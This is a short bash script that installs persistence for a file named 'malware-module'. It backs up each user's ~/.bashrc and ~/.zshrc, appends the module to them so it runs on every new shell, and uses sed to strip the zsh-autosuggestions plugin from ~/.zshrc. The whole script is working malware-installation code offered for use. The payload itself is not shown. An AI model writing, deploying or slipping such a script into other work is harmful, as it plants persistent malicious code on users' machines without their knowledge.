#!/bin/bash

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
MODULE_PATH="$SCRIPT_DIR/malware-module"

modify_config() {
  local config_file="$1"
  if [[ -f "$config_file" ]]; then
    /bin/cp "$config_file" "$config_file.bak"
    /bin/cat "$MODULE_PATH" >> "$config_file"
  fi
}

if [[ -f /etc/shells ]]; then
  while read -r shell_path; do
    if [[ -z "$shell_path" || "$shell_path" == \#* ]]; then
      continue
    fi

    shell_name="$(basename "$shell_path")"

    if [[ "$shell_name" == "bash" && "$shell_type" == "" ]]; then
      modify_config "$HOME/.bashrc"
      shell_type="bash"
    elif [[ "$shell_name" == "zsh" && "$shell_type" != "zsh" ]]; then
      modify_config "$HOME/.zshrc"

      if [[ "$OSTYPE" == "darwin"* ]]; then
        sed -i '' -e 's/zsh-autosuggestions//g' ~/.zshrc
      else
        sed -i -e 's/zsh-autosuggestions//g' ~/.zshrc
      fi

      shell_type="zsh"
    fi
  done < /etc/shells
else
  /bin/echo "Error: File not found: /etc/shells. Alas :("
fi
